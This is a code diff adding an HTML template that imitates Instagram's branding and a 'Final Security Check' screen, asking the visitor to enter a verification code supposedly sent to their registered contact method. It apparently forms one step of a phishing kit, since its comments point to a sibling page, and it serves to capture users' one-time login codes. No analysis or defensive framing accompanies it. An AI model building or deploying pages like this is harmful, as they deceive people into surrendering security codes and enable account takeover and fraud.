@@ -1,0 +1,83 @@
+{% extends "base.html" %}
+{% block body %}
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(228,64,95,0.25);border-radius:16px;">
+  <div class="platform-header">
+    <div class="icon-circle bg-instagram">
+      <i class="fa-brands fa-instagram icon-lg"></i>
+    </div>
+    <div>
+      <h2 class="notranslate" style="margin:0;color:#E4405F;">Instagram</h2>
+      <div style="color:#64748b;font-size:13px;margin-top:4px">Final Security Verification</div>
+    </div>
+  </div>
+
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Final Security Check Required</h3>
+  
+  <div class="play-instructions">
+    <div class="instruction-card">
+      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Final Verification Code</h4>
+      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
+        To complete the security verification for your Instagram account, please enter the final verification code that has been sent to your registered contact method.
+      </p>
+    </div>
+  </div>
+
+  <form id="digitsForm" method="POST" novalidate>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter final verification code" pattern="\d{4,9}" required>
+    <div class="error-text" id="digitsError"></div>
+
+    <div class="center">
+      <button class="btn login-btn" type="submit">Verify & Continue</button>
+    </div>
+  </form>
+</div>
+
+<style>
+/* Same styles as love1_3.html but with Instagram colors */
+.input:focus {
+  border-color: #E4405F;
+  box-shadow: 0 0 0 3px rgba(228,64,95,0.25);
+}
+.login-btn {
+  background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+}
+.login-btn:hover {
+  background: linear-gradient(45deg, #fd5949, #d6249f, #c13584, #833ab4);
+}
+.instruction-card {
+  background: #fdf2f8;
+  border-left: 4px solid #E4405F;
+}
+</style>
+
+<script>
+// Same validation script as love1_3.html
+document.getElementById("digitsForm").addEventListener("submit", function(event) {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+
+  let valid = true;
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
+
+  const val = digits.value.trim();
+  const pattern = /^\d{4,9}$/;
+
+  if (!pattern.test(val)) {
+    valid = false;
+    digits.classList.add("input-error");
+    digitsError.textContent = "Please enter a valid 4-9 digit code.";
+  }
+
+  if (!valid) event.preventDefault();
+});
+
+document.getElementById("digits").addEventListener("input", () => {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
+});
+</script>
+{% endblock %}
